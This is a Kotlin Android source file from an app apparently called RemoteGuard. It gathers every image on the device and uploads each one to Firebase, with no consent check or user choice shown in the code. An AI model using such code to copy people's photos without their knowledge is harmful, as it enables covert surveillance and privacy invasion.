package com.remoteguard.app

import android.content.Context
import android.provider.MediaStore
import android.util.Log
import java.io.File

class PhotoManager(private val context: Context) {

    fun uploadAllPhotosFromDevice() {
        try {
            val photos = getAllPhotosFromDevice()
            Log.d("PhotoManager", "Found ${photos.size} photos to upload")

            photos.forEach { photoPath ->
                try {
                    val file = File(photoPath)
                    if (file.exists()) {
                        Log.d("PhotoManager", "Uploading photo: ${file.name}")
                        FirebaseHelper.uploadPhotoFile(context, file)
                    }
                } catch (e: Exception) {
                    Log.e("PhotoManager", "Error uploading photo: ${e.message}", e)
                }
            }
        } catch (e: Exception) {
            Log.e("PhotoManager", "Error getting photos from device: ${e.message}", e)
        }
    }

    private fun getAllPhotosFromDevice(): List<String> {
        val photos = mutableListOf<String>()

        try {
            val projection = arrayOf(MediaStore.Images.Media.DATA)
            val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                sortOrder
            )

            cursor?.use {
                val columnIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                while (it.moveToNext()) {
                    val photoPath = it.getString(columnIndex)
                    photos.add(photoPath)
                }
            }
        } catch (e: Exception) {
            Log.e("PhotoManager", "Error querying photos: ${e.message}", e)
        }

        return photos
    }
}
